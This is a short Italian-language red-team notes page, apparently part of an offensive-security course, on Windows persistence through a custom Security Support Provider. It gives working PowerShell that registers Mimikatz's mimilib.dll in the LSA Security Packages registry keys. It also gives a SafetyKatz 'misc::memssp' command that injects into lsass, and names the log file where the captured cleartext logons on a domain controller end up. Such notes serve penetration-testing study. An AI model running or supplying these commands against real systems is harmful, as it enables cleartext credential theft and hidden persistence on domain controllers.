# Persistence - Custom SSP (Security Support Provider)

* Un Security Support Provider (SSP) e' una DLL che forninsce modalita' ad un'applicazione per ottenere connessioni autenticate
* Mimikatz fornsice un custom SSP - mimlib.dll. Questo SSP "logga" il logons locali, quelli dei service account e le password machine account in chiaro sul server target

Ci sono duemodi differenti per poterlo fare:&#x20;

* Copiare mimlib.dll nella folder system32 e aggiungere la dll alla chiave di registro HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ Security packages

```powershell
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name
'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```

* Utilizzando mimikatz, facendo injection nel processo lsass (NON cosi stabile con i Server 2019 e 2022 ma ancora utilizzabile)

```powershell
SafetyKatz.exe -Command '"misc::memssp"'
```

* Tutti i logon sul server target (sul DC) sono loggati sotto C:\Windows\system32\mimilsa.log

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
